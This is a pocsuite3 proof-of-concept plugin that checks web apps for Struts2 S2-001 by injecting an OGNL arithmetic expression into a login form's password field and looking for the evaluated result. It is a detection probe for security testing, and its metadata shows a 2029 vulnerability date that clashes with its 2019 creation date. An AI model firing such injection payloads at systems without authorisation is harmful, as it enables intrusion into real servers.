import random

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests


class DemoPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    author = ['']
    vulDate = '2029-5-8'
    createDate = '2019-5-8'
    updateDate = '2019-5-8'
    references = ['']
    name = ''
    appPowerLink = ''
    appName = 'struts2'
    appVersion = ''
    vulType = ''
    desc = '''S2-001:影响版本Struts 2.0.0-2.0.8'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        check_poc = "%25%7B{num1}%2B{num2}%7D"
        headers = {}
        headers['Content-Type'] = 'application/x-www-form-urlencoded'

        data = "username=test&password={exp}"
        num1 = random.randint(10000, 100000)
        num2 = random.randint(10000, 100000)
        poc = check_poc.format(num1=num1, num2=num2)
        data = data.format(exp=poc)

        html = requests.post(self.url, data=data, headers=headers).text
        nn = str(num1 + num2)
        if nn in html:
            result["VerifyInfo"] = {
                "URL": self.url,
                "PAYLOAD": data
            }

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
